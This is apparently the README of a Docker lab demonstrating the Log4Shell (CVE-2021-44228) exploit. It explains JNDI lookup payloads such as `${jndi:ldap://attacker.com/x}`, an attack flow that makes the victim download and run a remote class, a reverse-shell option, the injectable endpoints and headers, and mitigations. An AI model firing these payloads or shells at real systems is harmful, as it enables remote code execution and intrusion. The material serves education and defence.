# Log4Shell (CVE-2021-44228) Proof of Concept

A functional exploit demonstration for the Log4Shell vulnerability in Apache Log4j 2.

**Demo:** [YouTube Link]

## Background

On December 9, 2021, a critical vulnerability was disclosed in Apache Log4j 2, a logging library used across millions of Java applications. The vulnerability allows remote code execution by exploiting Log4j's message lookup substitution feature. When the library logs a string containing `${jndi:ldap://attacker.com/x}`, it interprets this as a JNDI lookup and connects to the specified server, which can instruct the victim to download and execute arbitrary code.

The vulnerability received a CVSS score of 10.0 and affected major services including iCloud, Steam, and Minecraft servers.

**Affected versions:** 2.0-beta9 through 2.14.1

## Attack Overview

```
Attacker                                        Victim (Log4j 2.14.1)
────────                                        ─────────────────────

1. Send malicious payload
   ${jndi:ldap://ldap:1389/a}  ───────────────> Application logs the input
                                                         │
                                                         ▼
                                                Log4j parses JNDI lookup
                                                         │
2. LDAP server receives lookup                           │
   ◄─────────────────────────────────────────────────────┘
   │
   ▼
3. Respond with: "Fetch Exploit.class
   from http://http:8888/"  ─────────────────────────────┐
                                                         │
                                                         ▼
4. HTTP server sends Exploit.class ◄──────────── Victim downloads class
                                                         │
                                                         ▼
                                                JVM loads class, static
                                                initializer executes
                                                         │
                                                         ▼
                                                Remote Code Execution
```

## Repository Structure

```
├── vulnerable-app/
│   ├── Dockerfile
│   ├── pom.xml
│   └── src/.../VulnerableApp.java      # Web server using Log4j 2.14.1
│
├── attacker-server/
│   ├── Dockerfile.ldap
│   ├── Dockerfile.http
│   ├── ldap_server.py                  # Responds to JNDI lookups
│   └── http_server.py                  # Serves malicious class files
│
├── exploits/
│   ├── Exploit.java                    # Payload: system reconnaissance
│   └── ExploitShell.java               # Payload: reverse shell
│
├── docker-compose.yml
└── run.sh
```

## Requirements

- Docker
- Docker Compose

## Usage

Build and start the environment:

```bash
./run.sh build
./run.sh start
```

### Option 1: Information Gathering

This payload executes system commands and displays the output in the victim's logs.

```bash
./run.sh exploit
```

View the results:

```bash
./run.sh logs
```

### Option 2: Reverse Shell

Opens an interactive shell on the victim machine.

Terminal 1 (start listener first):
```bash
./run.sh shell
```

Terminal 2 (trigger exploit):
```bash
./run.sh exploit-shell
```

You now have shell access to the victim. Type `exit` then Ctrl+C to disconnect.

### Verify Exploitation

```bash
./run.sh verify
```

This checks for `/tmp/pwned.txt` on the victim, created by the payload.

### Cleanup

```bash
./run.sh clean
```

## Injection Points

The vulnerable application exposes several endpoints where payloads can be injected:

| Endpoint | Method | Field |
|----------|--------|-------|
| /search | GET | `q` parameter |
| /login | POST | `username` field |
| /api/user | GET | `User-Agent` header |
| /api/user | GET | `X-Api-Token` header |

## Mitigation

1. Upgrade to Log4j 2.17.0 or later
2. Remove the JndiLookup class from the classpath:
   ```bash
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
   ```
3. Set `log4j2.formatMsgNoLookups=true` (incomplete fix, bypasses exist)

## References

- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://logging.apache.org/log4j/2.x/security.html
- https://www.lunasec.io/docs/blog/log4j-zero-day/

## Disclaimer

For educational purposes only. Unauthorized access to computer systems is illegal.